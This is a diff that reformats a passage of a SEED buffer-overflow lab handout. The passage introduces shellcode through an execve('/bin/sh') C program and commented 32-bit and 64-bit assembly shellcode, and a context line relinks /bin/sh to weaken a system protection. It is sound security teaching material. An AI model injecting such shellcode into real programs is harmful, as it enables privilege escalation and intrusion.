@@ -61,84 +61,71 @@ $ sudo ln -sf /bin/zsh /bin/sh
 
 ## 3 Task 1: Getting Familiar with Shellcode
 
-The ultimate goal of buffer-overflow attacks is to inject malicious code into the target program, so the
-code can be executed using the target program’s privilege. Shellcode is widely used in most code-injection
-attacks. Let us get familiar with it in this task.
+The ultimate goal of buffer-overflow attacks is to inject malicious code into the target program, so the code can be executed using the target program’s privilege. Shellcode is widely used in most code-injection attacks. Let us get familiar with it in this task.
 
 ### 3.1 The C Version of Shellcode
 
-A shellcode is basically a piece of code that launches a shell. If we use C code to implement it, it will look
-like the following:
-
+A shellcode is basically a piece of code that launches a shell. If we use C code to implement it, it will look like the following:
+```
 #include <stdio.h>
 
 int main() {
-char *name[2];
-
-
-name[0] = "/bin/sh";
-name[1] = NULL;
-execve(name[0], name, NULL);
+    char *name[2];
+    name[0] = "/bin/sh";
+    name[1] = NULL;
+    execve(name[0], name, NULL);
 }
-
+```
 Unfortunately, we cannot just compile this code and use the binary code as our shellcode (detailed
-explanation is provided in the SEED book). The best way to write a shellcode is to use assembly code. In
-this lab, we only provide the binary version of a shellcode, without explaining how it works (it is non-trivial).
-If you are interested in how exactly shellcode works and you want to write a shellcode from scratch, you
-can learn that from a separate SEED lab calledShellcode Lab.
+explanation is provided in the SEED book). The best way to write a shellcode is to use assembly code. In this lab, we only provide the binary version of a shellcode, without explaining how it works (it is non-trivial). If you are interested in how exactly shellcode works and you want to write a shellcode from scratch, you can learn that from a separate SEED lab called *Shellcode* Lab.
 
 ### 3.2 32-bit Shellcode
-
+```
 ; Store the command on stack
 xor eax, eax
 push eax
 push "//sh"
 push "/bin"
-mov ebx, esp ; ebx --> "/bin//sh": execve()’s 1st argument
+mov ebx, esp     ; ebx --> "/bin//sh": execve()’s 1st argument
 
 ; Construct the argument array argv[]
-push eax ; argv[1] = 0
-push ebx ; argv[0] --> "/bin//sh"
-mov ecx, esp ; ecx --> argv[]: execve()’s 2nd argument
+push eax         ; argv[1] = 0
+push ebx         ; argv[0] --> "/bin//sh"
+mov ecx, esp     ; ecx --> argv[]: execve()’s 2nd argument
 
 ; For environment variable
-xor edx, edx ; edx = 0: execve()’s 3rd argument
+xor edx, edx     ; edx = 0: execve()’s 3rd argument
 
 ; Invoke execve()
-xor eax, eax ;
-mov al, 0x0b ; execve()’s system call number
-int 0x
+xor eax, eax     ;
+mov al, 0x0b     ; execve()’s system call number
+int 0x80
+```
+The shellcode above basically invokes the `execve()` system call to execute `/bin/sh`. In a separate
+SEED lab, the Shellcode lab, we guide students to write shellcode from scratch. Here we only give a very brief explanation.
 
-The shellcode above basically invokes theexecve()system call to execute/bin/sh. In a separate
-SEED lab, the Shellcode lab, we guide students to write shellcode from scratch. Here we only give a very
-brief explanation.
-
-- The third instruction pushes"//sh", rather than"/sh"into the stack. This is because we need a
-    32-bit number here, and"/sh"has only 24 bits. Fortunately,"//"is equivalent to"/", so we can
+- The third instruction pushes"`//sh`", rather than "`/sh`" into the stack. This is because we need a
+    32-bit number here, and"`/sh`" has only 24 bits. Fortunately, "//" is equivalent to"/", so we can
     get away with a double slash symbol.
-- We need to pass three arguments toexecve()via theebx,ecxandedxregisters, respectively.
-    The majority of the shellcode basically constructs the content for these three arguments.
-- The system callexecve()is called when we setalto0x0b, and execute"int 0x80".
+- We need to pass three arguments to `execve()` via the `ebx`, `ecx` and `edx` registers, respectively. The majority of the shellcode basically constructs the content for these three arguments.
+- The system call `execve()` is called when we set `al` to `0x0b`, and execute "`int 0x80`".
 
 ### 3.3 64-Bit Shellcode
 
-We provide a sample 64-bit shellcode in the following. It is quite similar to the 32-bit shellcode, except
-that the names of the registers are different and the registers used by theexecve()system call are also
-different. Some explanation of the code is given in the comment section, and we will not provide detailed
-explanation on the shellcode.
-
-
-xor rdx, rdx ; rdx = 0: execve()’s 3rd argument
+We provide a sample 64-bit shellcode in the following. It is quite similar to the 32-bit shellcode, except that the names of the registers are different and the registers used by the `execve()` system call are also different. Some explanation of the code is given in the comment section, and we will not provide detailed explanation on the shellcode.
+```
+xor rdx, rdx         ; rdx = 0: execve()’s 3rd argument
 push rdx
-mov rax, ’/bin//sh’ ; the command we want to run
-push rax ;
-mov rdi, rsp ; rdi --> "/bin//sh": execve()’s 1st argument
-push rdx ; argv[1] = 0
-push rdi ; argv[0] --> "/bin//sh"
-mov rsi, rsp ; rsi --> argv[]: execve()’s 2nd argument
+mov rax, ’/bin//sh’  ; the command we want to run
+push rax             ;
+mov rdi, rsp         ; rdi --> "/bin//sh": execve()’s 1st argument
+push rdx             ; argv[1] = 0
+push rdi             ; argv[0] --> "/bin//sh"
+mov rsi, rsp         ; rsi --> argv[]: execve()’s 2nd argument
 xor rax, rax
-mov al, 0x3b ; execve()’s system call number
+mov al, 0x3b         ; execve()’s system call number
 syscall
+```
 
 ### 3.4 Task: Invoking the Shellcode
 
